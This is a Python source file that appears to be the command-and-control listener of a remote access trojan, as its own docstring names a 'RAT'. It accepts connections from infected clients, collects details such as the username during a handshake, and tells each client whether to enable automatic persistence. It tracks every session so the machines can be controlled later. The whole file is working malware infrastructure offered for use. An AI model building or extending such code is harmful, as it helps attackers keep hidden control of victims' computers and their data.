import socket
import threading
import time
import socket

from .other import printColor


class Handler(threading.Thread):
    #Manage incoming connections with a thread system
    dict_conn={}# dict = tuple | dict = socket,address  Stores all socket, ip, port and connection health status.
    number_conn=0  #count number of connexions
    status_connection_display = True 
    start_handler = False

#    ptable = PrettyTable() #Ascii tables dynamic.
#    ptable.field_names =["Session","IP","Port","Is he alive"] #append title of row.

    def __init__(self,host,port,display,auto_persistence):

        threading.Thread.__init__(self)
        self.port = port 
        self.host = host
        self.sock_server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.display = display
        self.auto_persistence = auto_persistence
    def SuccessfullyQuit(self):
        try:
            print("\n")
            for key,value in Handler.dict_conn.items():
                value[0].close()
                printColor("error","[-] {}:{} Connection closed.".format(value[1],value[2]))
                
        except Exception  as e: 
            printColor("error","[-] Error closing a socket. Error: {}".format(e))
            pass
        
        self.sock_server.close()
        printColor("error","\r[-] Connexion server closed.")
        
    
    def run(self):
        Handler.status_connection_display = self.display
        
        while True:
            #Test if the port listening is good.
            try:
                self.sock_server.bind((self.host,self.port))
                break
            except OSError as e:
                printColor("error","[-] Port {} is already busy or you don't have permission to listen on this port !".format(self.port))
                #printColor("error","[-] "+str(e)+".")
                printColor("information","[?] The server will try again to listen on port {}. If the server is still unable to listen on the port {} make sure to check which service is blocked with: netstat -petulan |grep {} command.".format(self.port,self.port,self.port))
                time.sleep(3)
                print("\n")
                
        Handler.start_handler = True #You can start the management 
        self.sock_server.listen(10)
        while True:               
    
            conn,address = self.sock_server.accept()
            if(Handler.status_connection_display):
                printColor("information","\r[+] New client {}:{}".format(address[0],address[1]))
            else:
                pass
            
            handshake = HandShake(conn,address,self.auto_persistence)
            handshake.daemon = True
            handshake.start()



class HandShake(threading.Thread):
  
    '''
This class is used to manage connections once the accepted function has been called.
Manual control allows to add crucial information like username, RAT and stores etc. to the main dictionary.
The client first sends this information, then the server sends the parameters as auto persistence. 

    '''
    def __init__(self,conn,address,auto_persistence):
        threading.Thread.__init__(self)
        self.conn = conn
        self.address = address
        self.auto_persistence = auto_persistence
    
    def recvFirstInfo(self):
        #Collect informations with Handshake client.
        list_info = []
        while True:
            self.conn.settimeout(3)
            try:    
                data = self.conn.recv(256).decode("latin1")
            except socket.timeout:
                print("TIMEOUTTT")
            else:
                #print("persi>",data)
                if data == "\r\n":
                    break
           
            tmp = data.split("|")
            list_info.append(tmp[1])
        
        print("Fini")
        self.conn.settimeout(None)
        return list_info
    
    def sendParameterOfServer(self):
        if(self.auto_persistence):
            self.conn.send(b"MOD_HANDSHAKE_AUTO_PERSISTENCE | True")
            print("MOD_HANDSHAKE_AUTO_PERSISTENCE | True")

        else:
            self.conn.send(b"MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
            print("MOD_HANDSHAKE_AUTO_PERSISTENCE | False")
        self.conn.send(b"\r\n") #end echange.
        

    def run(self):

        list_info = self.recvFirstInfo() #Collect informations with Handshake client. #1
        print("sencode part persi go !!!! ")
        self.sendParameterOfServer() #2

        #print(list_info)
        Handler.dict_conn[Handler.number_conn] = [self.conn, self.address[0],self.address[1], True, list_info[0], list_info[1], list_info[2]] #3 #True = Connexion is life 
        #print(Handler.dict_conn)
        Handler.number_conn+=1 #4
